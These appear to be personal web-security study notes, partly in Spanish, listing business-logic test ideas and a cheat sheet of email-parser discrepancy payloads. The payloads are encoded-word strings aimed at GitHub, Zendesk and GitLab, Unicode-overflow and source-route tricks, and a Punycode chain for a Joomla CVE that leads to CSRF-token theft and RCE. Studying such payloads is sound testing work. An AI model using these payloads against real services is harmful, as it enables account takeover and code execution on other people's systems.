# Business logic vulnerabilities

## Failing to handle unconventional input
- Cantidad máxima de números
- Cantidad máxima de caracteres

## Users won't always supply mandatory input
- Validar las respuestas cuando mnadas un parametro obligatorio vacío o cuando lo envias sin ese parametro

## Users won't always follow the intended sequence
- Validar el proceso cuando sale correcto e incorrecto
- Dropear procesos para ver como lo maneja el servidor

## Providing an encryption oracle
- Si existe encriptaciones en al app fijarse si hay un lugar que desencripte los valores encriptados

## Email address parser discrepancies
### Trucos de mailer
- UUCP:      oastify.com!collab\@example.com
- Source route: collab%psres.net(@example.com
- Percent hack: foo%psres.net@example.com

### Unicode overflow (generar @ bloqueado)
- String.fromCodePoint(0x100 + 0x40) -> @
- Hackvertor: <@_unicode_overflow(0x100,'...')>@</@_unicode_overflow>

### Encoded-word (RFC2047) - Recon
- =?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
- =?utf-8?q?=61=62=63?=foo@ginandjuice.shop
- =?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop

### Encoded-word - Explotación
- GitHub:   =?x?q?=40=3E=00foo?=@psres.net   (@ + > + null)
- Zendesk:  =?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net (quotes+<)
- GitLab:   =?x?q?...=3e=5f?=@psres.net      (_ = espacio codificado)
- Burp: =?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop

### Punycode malformado -> XSS/RCE (Joomla, CVE-2024-21725)
- x@xn--svg/-9x6 -> x@<svg/
- 1 subdominio -> genera <style> persistente -> @import CSS -> exfiltra
  CSRF token -> RCE
